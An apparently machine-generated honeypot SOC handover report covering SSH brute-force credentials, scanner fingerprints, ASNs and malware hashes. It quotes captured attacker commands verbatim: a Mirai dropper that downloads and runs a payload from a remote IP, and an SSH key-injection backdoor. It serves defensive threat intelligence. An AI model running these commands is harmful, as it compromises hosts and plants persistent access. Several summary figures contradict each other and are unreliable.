# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-17 |
| **Generated At** | 2026-08-17T22:29:44Z |
| **Shift Time** | 22:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **2840** |
| Confirmed Threats | **0** |
| False Positives Filtered | **2840** (100.0%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **0** |
| High Severity Cases | **261** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **2579** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **282** |
| Unique Credential Pairs | **245** |
| Unique Usernames | **121** |
| Unique Passwords | **171** |
| Successful Auth Pairs | **270** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `support` | 13 |
| `user` | 10 |
| `test` | 9 |
| `deploy` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 12 |
| `123` | 11 |
| `root` | 8 |
| `1` | 7 |
| `1234` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `test` | `test2025` | 6 |
| `blank` | `blank2015` | 6 |
| `debian` | `debian2017` | 5 |
| `support` | `support2020` | 5 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin2` | `1234` | `45.153.34.144` | 2026-08-17T18:55:05 |
| `pi` | `root` | `45.153.34.144` | 2026-08-17T18:55:13 |
| `packer` | `packer` | `45.153.34.144` | 2026-08-17T18:55:19 |
| `core` | `1qaz2wsx` | `45.153.34.144` | 2026-08-17T18:55:26 |
| `testuser` | `test` | `45.153.34.144` | 2026-08-17T18:55:33 |
| `runner` | `root` | `45.153.34.144` | 2026-08-17T18:55:40 |
| `root` | `huawei@123` | `45.153.34.144` | 2026-08-17T18:55:47 |
| `labuser` | `labuser` | `45.153.34.144` | 2026-08-17T18:55:54 |
| `administrator` | `12345678` | `45.153.34.144` | 2026-08-17T18:56:01 |
| `ts` | `ts` | `45.153.34.144` | 2026-08-17T18:56:08 |
| `root` | `qq123456` | `45.153.34.144` | 2026-08-17T18:56:15 |
| `grok` | `12345678` | `45.153.34.144` | 2026-08-17T18:56:22 |
| `root` | `aA123456` | `45.153.34.144` | 2026-08-17T18:56:29 |
| `webmaster` | `webmaster` | `45.153.34.144` | 2026-08-17T18:56:36 |
| `root` | `1qazXSW@` | `45.153.34.144` | 2026-08-17T18:56:43 |
| `devops` | `123456789` | `45.153.34.144` | 2026-08-17T18:56:49 |
| `mcserver` | `mcserver` | `45.153.34.144` | 2026-08-17T18:56:56 |
| `root` | `admin1` | `45.153.34.144` | 2026-08-17T18:57:04 |
| `wso2` | `wso2` | `45.153.34.144` | 2026-08-17T18:57:11 |
| `root` | `rootroot` | `45.153.34.144` | 2026-08-17T18:57:17 |
| `agent` | `agent` | `45.153.34.144` | 2026-08-17T18:57:24 |
| `pi` | `12345678` | `45.153.34.144` | 2026-08-17T18:57:31 |
| `zabbix` | `zabbix` | `45.153.34.144` | 2026-08-17T18:57:38 |
| `deploy` | `1` | `45.153.34.144` | 2026-08-17T18:57:46 |
| `root` | `Abc123456` | `45.153.34.144` | 2026-08-17T18:57:53 |
| `admin` | `Admin@123` | `45.153.34.144` | 2026-08-17T18:58:01 |
| `root` | `helloworld` | `45.153.34.144` | 2026-08-17T18:58:08 |
| `fastuser` | `123456789` | `45.153.34.144` | 2026-08-17T18:58:15 |
| `root` | `Admin@123` | `45.153.34.144` | 2026-08-17T18:58:23 |
| `ubuntu` | `rootroot` | `45.153.34.144` | 2026-08-17T18:58:30 |
| `username` | `user` | `45.153.34.144` | 2026-08-17T18:58:37 |
| `ubuntu` | `Aa123456` | `45.153.34.144` | 2026-08-17T18:58:44 |
| `steam` | `1` | `45.153.34.144` | 2026-08-17T18:58:51 |
| `hadoop` | `123` | `45.153.34.144` | 2026-08-17T18:58:57 |
| `root` | `HsG4sAXaCo` | `8.217.180.182` | 2026-08-17T18:58:58 |
| `default` | `987654321` | `10.0.0.73` | 2026-08-17T18:59:00 |
| `karel` | `karel` | `45.153.34.144` | 2026-08-17T18:59:04 |
| `jakob` | `jakob` | `45.153.34.144` | 2026-08-17T18:59:11 |
| `root` | `nimda` | `45.153.34.144` | 2026-08-17T18:59:18 |
| `amine` | `amine` | `45.153.34.144` | 2026-08-17T18:59:24 |
| `a` | `a` | `45.153.34.144` | 2026-08-17T18:59:30 |
| `home` | `root` | `45.153.34.144` | 2026-08-17T18:59:37 |
| `root` | `toor` | `45.153.34.144` | 2026-08-17T18:59:43 |
| `gns3` | `gns3` | `45.153.34.144` | 2026-08-17T18:59:50 |
| `debian` | `12345` | `45.153.34.144` | 2026-08-17T18:59:57 |
| `guest` | `guest2011` | `196.189.59.226` | 2026-08-17T19:00:00 |
| `student` | `123456` | `45.153.34.144` | 2026-08-17T19:00:03 |
| `user` | `111111` | `45.153.34.144` | 2026-08-17T19:00:10 |
| `ai` | `toor` | `45.153.34.144` | 2026-08-17T19:00:17 |
| `root` | `Ab123456` | `45.153.34.144` | 2026-08-17T19:00:24 |
| `gpadmin` | `1234.com` | `217.165.22.192` | 2026-08-17T19:00:29 |
| `user1` | `123456` | `45.153.34.144` | 2026-08-17T19:00:30 |
| `ts3` | `teamspeak` | `45.153.34.144` | 2026-08-17T19:00:37 |
| `root` | `1q2w3e4r` | `45.153.34.144` | 2026-08-17T19:00:44 |
| `nginx` | `toor` | `45.153.34.144` | 2026-08-17T19:00:51 |
| `deploy` | `123` | `45.153.34.144` | 2026-08-17T19:00:58 |
| `guest` | `abc123` | `45.153.34.144` | 2026-08-17T19:01:04 |
| `myuser` | `123` | `45.153.34.144` | 2026-08-17T19:01:10 |
| `root` | `Abcd1234` | `45.153.34.144` | 2026-08-17T19:01:17 |
| `fa` | `fa` | `45.153.34.144` | 2026-08-17T19:01:23 |
| `jellyfin` | `123` | `45.153.34.144` | 2026-08-17T19:01:29 |
| `sam` | `sam` | `45.153.34.144` | 2026-08-17T19:01:36 |
| `media` | `media` | `45.153.34.144` | 2026-08-17T19:01:43 |
| `root` | `12345qwe` | `45.153.34.144` | 2026-08-17T19:01:49 |
| `admin` | `1234` | `45.153.34.144` | 2026-08-17T19:01:55 |
| `frappe` | `frappe@123` | `45.153.34.144` | 2026-08-17T19:02:01 |
| `admin` | `0000` | `45.153.34.144` | 2026-08-17T19:02:07 |
| `deploy` | `123123` | `45.153.34.144` | 2026-08-17T19:02:13 |
| `odoo14` | `odoo` | `45.153.34.144` | 2026-08-17T19:02:20 |
| `user` | `1qaz@WSX` | `45.153.34.144` | 2026-08-17T19:02:26 |
| `root` | `root123` | `45.153.34.144` | 2026-08-17T19:02:32 |
| `xiao` | `xiao` | `45.153.34.144` | 2026-08-17T19:02:39 |
| `root` | `Admin123` | `45.153.34.144` | 2026-08-17T19:02:46 |
| `nexus` | `pi` | `45.153.34.144` | 2026-08-17T19:02:52 |
| `fastuser` | `1234567890` | `45.153.34.144` | 2026-08-17T19:02:59 |
| `user` | `git` | `45.153.34.144` | 2026-08-17T19:03:06 |
| `pi` | `1` | `45.153.34.144` | 2026-08-17T19:03:12 |
| `test` | `test1234` | `45.153.34.144` | 2026-08-17T19:03:18 |
| `support` | `support` | `10.0.0.73` | 2026-08-17T19:03:22 |
| `sysupdate` | `123456` | `45.153.34.144` | 2026-08-17T19:03:25 |
| `default` | `default` | `45.153.34.144` | 2026-08-17T19:03:30 |
| `root` | `q1w2e3r4` | `45.153.34.144` | 2026-08-17T19:03:36 |
| `frappe` | `frappe` | `45.153.34.144` | 2026-08-17T19:03:43 |
| `teste` | `teste` | `45.153.34.144` | 2026-08-17T19:03:49 |
| `devops` | `1234` | `45.153.34.144` | 2026-08-17T19:03:56 |
| `rancher` | `rancher123` | `45.153.34.144` | 2026-08-17T19:04:02 |
| `sftpuser` | `123` | `45.153.34.144` | 2026-08-17T19:04:09 |
| `debian` | `Aa123456.` | `45.153.34.144` | 2026-08-17T19:04:15 |
| `root` | `******` | `45.153.34.144` | 2026-08-17T19:04:21 |
| `openclaw` | `user` | `45.153.34.144` | 2026-08-17T19:04:28 |
| `root` | `1029384756` | `45.153.34.144` | 2026-08-17T19:04:35 |
| `student` | `student123` | `45.153.34.144` | 2026-08-17T19:04:41 |
| `testuser` | `123` | `45.153.34.144` | 2026-08-17T19:04:47 |
| `appuser` | `12345` | `45.153.34.144` | 2026-08-17T19:04:54 |
| `root` | `baidu123` | `45.153.34.144` | 2026-08-17T19:05:01 |
| `odoo14` | `odoo14` | `45.153.34.144` | 2026-08-17T19:05:08 |
| `bot` | `root` | `45.153.34.144` | 2026-08-17T19:05:14 |
| `git` | `1234` | `45.153.34.144` | 2026-08-17T19:05:21 |
| `postgres` | `123` | `45.153.34.144` | 2026-08-17T19:05:28 |
| `trader` | `trader` | `45.153.34.144` | 2026-08-17T19:05:35 |
| `app` | `app` | `45.153.34.144` | 2026-08-17T19:05:41 |
| `dolphinscheduler` | `dolphinscheduler` | `45.153.34.144` | 2026-08-17T19:05:48 |
| `btc` | `btc` | `45.153.34.144` | 2026-08-17T19:05:55 |
| `gabriel` | `123321` | `45.153.34.144` | 2026-08-17T19:06:03 |
| `t1` | `123` | `45.153.34.144` | 2026-08-17T19:06:10 |
| `deploy` | `rootroot` | `45.153.34.144` | 2026-08-17T19:06:17 |
| `deploy` | `deploy` | `45.153.34.144` | 2026-08-17T19:06:24 |
| `root` | `12qwaszx` | `45.153.34.144` | 2026-08-17T19:06:31 |
| `root` | `102030` | `45.153.34.144` | 2026-08-17T19:06:38 |
| `root` | `Aa@123456` | `45.153.34.144` | 2026-08-17T19:06:45 |
| `system` | `system` | `45.153.34.144` | 2026-08-17T19:06:51 |
| `dev` | `111111` | `45.153.34.144` | 2026-08-17T19:06:59 |
| `zimbra` | `zimbra` | `45.153.34.144` | 2026-08-17T19:07:05 |
| `bernard` | `bernard` | `45.153.34.144` | 2026-08-17T19:07:13 |
| `root` | `a123456A` | `45.153.34.144` | 2026-08-17T19:07:20 |
| `root` | `root@123` | `45.153.34.144` | 2026-08-17T19:07:27 |
| `alex` | `1` | `45.153.34.144` | 2026-08-17T19:07:34 |
| `root` | `zaq12wsx` | `45.153.34.144` | 2026-08-17T19:07:41 |
| `kali` | `kali` | `45.153.34.144` | 2026-08-17T19:07:48 |
| `ubuntu` | `123321` | `45.153.34.144` | 2026-08-17T19:07:55 |
| `user` | `12345678` | `45.153.34.144` | 2026-08-17T19:08:03 |
| `root` | `rootrootroot` | `45.153.34.144` | 2026-08-17T19:08:10 |
| `ubuntu` | `qwe123` | `45.153.34.144` | 2026-08-17T19:08:16 |
| `gitlab` | `root` | `45.153.34.144` | 2026-08-17T19:08:23 |
| `deploy` | `123456789` | `45.153.34.144` | 2026-08-17T19:08:31 |
| `mysql` | `mysql` | `45.153.34.144` | 2026-08-17T19:08:39 |
| `debian` | `qwerty` | `45.153.34.144` | 2026-08-17T19:08:46 |
| `user2` | `123` | `45.153.34.144` | 2026-08-17T19:08:53 |
| `milad` | `milad123` | `45.153.34.144` | 2026-08-17T19:09:01 |
| `kevin` | `kevin` | `45.153.34.144` | 2026-08-17T19:09:09 |
| `ubuntu` | `1qaz@WSX` | `45.153.34.144` | 2026-08-17T19:09:16 |
| `odoo18` | `123` | `45.153.34.144` | 2026-08-17T19:09:23 |
| `odoo16` | `odoo16` | `45.153.34.144` | 2026-08-17T19:09:30 |
| `rancher` | `rancher` | `45.153.34.144` | 2026-08-17T19:09:37 |
| `newuser` | `newuser` | `45.153.34.144` | 2026-08-17T19:09:45 |
| `config` | `config` | `45.153.34.144` | 2026-08-17T19:09:52 |
| `dev` | `password` | `45.153.34.144` | 2026-08-17T19:10:00 |
| `root` | `09N1RCa1Hs31` | `85.158.145.129` | 2026-08-17T19:10:07 |
| `openclaw` | `123456` | `45.153.34.144` | 2026-08-17T19:10:07 |
| `tester` | `test` | `45.153.34.144` | 2026-08-17T19:10:14 |
| `user` | `qwe123456` | `45.153.34.144` | 2026-08-17T19:10:21 |
| `user3` | `1` | `45.153.34.144` | 2026-08-17T19:10:29 |
| `postgres` | `1` | `45.153.34.144` | 2026-08-17T19:10:36 |
| `root` | `Aa123123` | `45.153.34.144` | 2026-08-17T19:10:43 |
| `test` | `123456` | `45.153.34.144` | 2026-08-17T19:10:50 |
| `omm` | `omm` | `45.153.34.144` | 2026-08-17T19:10:58 |
| `admin` | `admin123!` | `45.153.34.144` | 2026-08-17T19:11:05 |
| `deploy` | `qwerty123` | `45.153.34.144` | 2026-08-17T19:11:12 |
| `gpadmin` | `gpadmin` | `45.153.34.144` | 2026-08-17T19:11:20 |
| `neptune` | `neptune` | `45.153.34.144` | 2026-08-17T19:11:27 |
| `clawdbot` | `clawdbot` | `45.153.34.144` | 2026-08-17T19:11:34 |
| `bot` | `bot` | `45.153.34.144` | 2026-08-17T19:11:41 |
| `user` | `123456` | `45.153.34.144` | 2026-08-17T19:11:48 |
| `gabriel` | `1q2w3e4r` | `45.153.34.144` | 2026-08-17T19:11:55 |
| `jellyfin` | `root` | `45.153.34.144` | 2026-08-17T19:12:10 |
| `root` | `r00t` | `45.153.34.144` | 2026-08-17T19:12:17 |
| `kafka` | `kafka` | `45.153.34.144` | 2026-08-17T19:12:24 |
| `system` | `12345` | `45.153.34.144` | 2026-08-17T19:12:31 |
| `root` | `Ac123456` | `45.153.34.144` | 2026-08-17T19:12:39 |
| `claude` | `123` | `45.153.34.144` | 2026-08-17T19:12:46 |
| `server` | `server` | `45.153.34.144` | 2026-08-17T19:12:53 |
| `pi` | `1234` | `45.153.34.144` | 2026-08-17T19:13:00 |
| `root` | `Qwerty123` | `45.153.34.144` | 2026-08-17T19:13:07 |
| `root` | `changemeNOW` | `45.153.34.144` | 2026-08-17T19:13:14 |
| `aiuser` | `aiuser` | `45.153.34.144` | 2026-08-17T19:13:21 |
| `vpn` | `vpn` | `45.153.34.144` | 2026-08-17T19:13:29 |
| `mc` | `mc` | `45.153.34.144` | 2026-08-17T19:13:36 |
| `test` | `123456789` | `45.153.34.144` | 2026-08-17T19:13:43 |
| `appuser` | `appuser` | `45.153.34.144` | 2026-08-17T19:13:50 |
| `playground` | `playground` | `45.153.34.144` | 2026-08-17T19:13:58 |
| `odoo` | `odoo` | `45.153.34.144` | 2026-08-17T19:14:05 |
| `odoo18` | `odoo` | `45.153.34.144` | 2026-08-17T19:14:13 |
| `appuser` | `password` | `45.153.34.144` | 2026-08-17T19:14:20 |
| `git` | `dev` | `45.153.34.144` | 2026-08-17T19:14:27 |
| `root` | `QWEqwe123` | `45.153.34.144` | 2026-08-17T19:14:34 |
| `admin` | `111` | `45.153.34.144` | 2026-08-17T19:14:42 |
| `minecraft` | `1` | `45.153.34.144` | 2026-08-17T19:14:49 |
| `postgres` | `123456` | `45.153.34.144` | 2026-08-17T19:14:56 |
| `root` | `1qaz!QAZ` | `45.153.34.144` | 2026-08-17T19:15:04 |
| `www` | `123321` | `45.153.34.144` | 2026-08-17T19:15:11 |
| `deploy` | `toor` | `45.153.34.144` | 2026-08-17T19:15:18 |
| `niaoyun` | `123456` | `45.153.34.144` | 2026-08-17T19:15:25 |
| `postgres` | `zabbix` | `159.112.138.47` | 2026-08-17T19:15:25 |
| `345gs5662d34` | `345gs5662d34` | `159.112.138.47` | 2026-08-17T19:15:28 |
| `postgres` | `3245gs5662d34` | `159.112.138.47` | 2026-08-17T19:15:29 |
| `user4` | `user4` | `45.153.34.144` | 2026-08-17T19:15:32 |
| `root` | `AA123456` | `45.153.34.144` | 2026-08-17T19:15:39 |
| `administrator` | `administrator` | `45.153.34.144` | 2026-08-17T19:15:46 |
| `dspace` | `dspace` | `45.153.34.144` | 2026-08-17T19:15:53 |
| `support` | `support2001` | `10.0.0.73` | 2026-08-17T19:15:59 |
| `root` | `123456789` | `45.153.34.144` | 2026-08-17T19:16:01 |
| `dixi` | `09N1RCa1Hs31` | `85.158.145.129` | 2026-08-17T19:16:02 |
| `root` | `Yun@wocloud.szkj` | `45.153.34.144` | 2026-08-17T19:16:08 |
| `prefect` | `prefect` | `45.153.34.144` | 2026-08-17T19:16:16 |
| `ansible` | `qwerty` | `45.153.34.144` | 2026-08-17T19:16:23 |
| `root` | `test1234` | `45.153.34.144` | 2026-08-17T19:16:30 |
| `azureuser` | `12345` | `45.153.34.144` | 2026-08-17T19:16:38 |
| `rdpuser` | `123456789` | `45.153.34.144` | 2026-08-17T19:16:46 |
| `solana` | `1234` | `45.153.34.144` | 2026-08-17T19:16:54 |
| `node` | `node` | `45.153.34.144` | 2026-08-17T19:17:01 |
| `root` | `Password@123` | `45.153.34.144` | 2026-08-17T19:17:08 |
| `labuser` | `p@ssw0rd` | `45.153.34.144` | 2026-08-17T19:17:15 |
| `vyos` | `vyos` | `45.153.34.144` | 2026-08-17T19:17:22 |
| `vbox` | `123456` | `45.153.34.144` | 2026-08-17T19:17:30 |
| `support` | `support2001` | `196.189.126.10` | 2026-08-17T19:17:34 |
| `kingbase` | `kingbase` | `45.153.34.144` | 2026-08-17T19:17:37 |
| `deployer` | `deployer123` | `45.153.34.144` | 2026-08-17T19:17:45 |
| `vncuser` | `password` | `45.153.34.144` | 2026-08-17T19:17:52 |
| `server` | `root` | `45.153.34.144` | 2026-08-17T19:18:00 |
| `sgp` | `sgp` | `192.140.185.8` | 2026-08-17T19:19:04 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-08-17T19:19:10 |
| `ftp_test` | `1qaz@WSX3edc` | `217.165.22.192` | 2026-08-17T19:19:34 |
| `default` | `default2014` | `60.171.135.254` | 2026-08-17T19:21:01 |
| `root` | `33` | `187.62.87.27` | 2026-08-17T19:21:19 |
| `345gs5662d34` | `345gs5662d34` | `187.62.87.27` | 2026-08-17T19:21:21 |
| `root` | `3245gs5662d34` | `187.62.87.27` | 2026-08-17T19:21:22 |
| `root` | `rootroot` | `85.158.145.129` | 2026-08-17T19:21:57 |
| `default` | `default2016` | `188.168.86.6` | 2026-08-17T19:22:11 |
| `default` | `default2016` | `122.187.237.122` | 2026-08-17T19:22:21 |
| `root` | `pw1234` | `85.158.145.129` | 2026-08-17T19:27:52 |
| `support` | `support2001` | `218.15.224.102` | 2026-08-17T19:33:23 |
| `support` | `support2001` | `103.121.27.218` | 2026-08-17T19:33:32 |
| `root` | `!123456` | `85.158.145.129` | 2026-08-17T19:33:49 |
| `test` | `test2025` | `10.0.0.73` | 2026-08-17T19:37:15 |
| `dbadmin` | `Abc1234` | `217.165.22.192` | 2026-08-17T19:38:39 |
| `root` | `admin` | `45.198.224.26` | 2026-08-17T19:43:59 |
| `debian` | `debian2017` | `10.0.0.73` | 2026-08-17T19:49:15 |
| `default` | `default2014` | `101.13.1.58` | 2026-08-17T19:49:42 |
| `default` | `default2014` | `112.28.73.142` | 2026-08-17T19:49:56 |
| `debian` | `debian2017` | `36.161.30.29` | 2026-08-17T19:50:48 |
| `root` | `12345x` | `85.158.145.129` | 2026-08-17T19:51:35 |
| `support` | `support2020` | `195.222.57.183` | 2026-08-17T19:54:43 |
| `support` | `support2020` | `213.154.80.51` | 2026-08-17T19:54:50 |
| `test` | `test2025` | `124.239.129.2` | 2026-08-17T19:55:32 |
| `test` | `test2025` | `35.130.111.98` | 2026-08-17T19:55:44 |
| `test` | `test2025` | `14.54.22.11` | 2026-08-17T19:55:45 |
| `test` | `test2025` | `153.37.177.219` | 2026-08-17T19:55:54 |
| `support` | `support` | `176.53.159.196` | 2026-08-17T19:56:48 |
| `root` | `Pa22word` | `85.158.145.129` | 2026-08-17T19:57:30 |
| `informix` | `p@ssw0rd` | `217.165.22.192` | 2026-08-17T19:57:44 |
| `root` | `pa22word` | `85.158.145.129` | 2026-08-17T20:03:27 |
| `support` | `support2020` | `10.0.0.73` | 2026-08-17T20:06:12 |
| `debian` | `debian2017` | `64.72.74.162` | 2026-08-17T20:06:39 |
| `debian` | `debian2017` | `122.160.142.194` | 2026-08-17T20:06:48 |
| `ubuntu` | `progres` | `85.158.145.129` | 2026-08-17T20:09:24 |
| `user` | `user2020` | `10.0.0.73` | 2026-08-17T20:10:49 |
| `root` | `!QAZ@WSX3e` | `85.158.145.129` | 2026-08-17T20:15:22 |
| `dspace` | `dspace@1234` | `217.165.22.192` | 2026-08-17T20:16:49 |
| `root` | `@!qwe123` | `85.158.145.129` | 2026-08-17T20:21:17 |
| `lby` | `123456` | `85.240.193.104` | 2026-08-17T20:21:43 |
| `345gs5662d34` | `345gs5662d34` | `85.240.193.104` | 2026-08-17T20:21:46 |
| `lby` | `3245gs5662d34` | `85.240.193.104` | 2026-08-17T20:21:48 |
| `blank` | `blank2015` | `10.0.0.73` | 2026-08-17T20:22:29 |
| `support` | `support2020` | `81.214.38.139` | 2026-08-17T20:23:13 |
| `blank` | `blank2015` | `112.6.11.184` | 2026-08-17T20:24:13 |
| `blank` | `blank2015` | `65.20.163.103` | 2026-08-17T20:24:25 |
| `root` | `Admin!@#` | `85.158.145.129` | 2026-08-17T20:27:13 |
| `unknown` | `unknown123` | `65.20.163.103` | 2026-08-17T20:28:28 |
| `unknown` | `unknown123` | `219.248.65.30` | 2026-08-17T20:28:38 |
| `user` | `user2020` | `220.180.166.214` | 2026-08-17T20:29:05 |
| `user` | `user2020` | `222.120.176.6` | 2026-08-17T20:29:15 |
| `root` | `P@$$W0RD` | `85.158.145.129` | 2026-08-17T20:33:09 |
| `git` | `Admin123` | `217.165.22.192` | 2026-08-17T20:35:55 |
| `root` | `P@$$w0rd` | `85.158.145.129` | 2026-08-17T20:39:06 |
| `blank` | `blank2015` | `92.84.21.186` | 2026-08-17T20:39:48 |
| `blank` | `blank2015` | `103.251.143.14` | 2026-08-17T20:39:56 |
| `supervisor` | `supervisor2021` | `10.0.0.73` | 2026-08-17T20:44:19 |
| `root` | `P@55w0rd` | `85.158.145.129` | 2026-08-17T20:45:00 |
| `root` | `P@55w0rd!` | `85.158.145.129` | 2026-08-17T20:50:55 |
| `applprod` | `Abc123` | `217.165.22.192` | 2026-08-17T20:55:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **2840** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 226 |
| OpenSSH | 28 |
| libssh | 14 |
| Unknown | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 198 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 28 | 27 |
| `98f63c4d9c87...` | Generic scanner | 19 | 2 |
| `e45f2d6d7f79...` | Mirai/variant | 7 | 1 |
| `f555226df196...` | Mirai/variant | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 198 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 28 | 27 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 19 | 2 | Generic scanner |
| `e45f2d6d7f79...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 7 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `159.112.138.47`, `85.240.193.104`, `187.62.87.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **57** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | LOW |
| `AS396982` | Google LLC | 3 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | LOW |
| `AS7418` | TELEFÓNICA CHILE S.A. | 2 | LOW |
| `AS24757` | Ethio Telecom | 2 | LOW |
| `AS4766` | Korea Telecom | 2 | LOW |
| `AS15774` | Limited Liability Company "TTK-Svyaz" | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
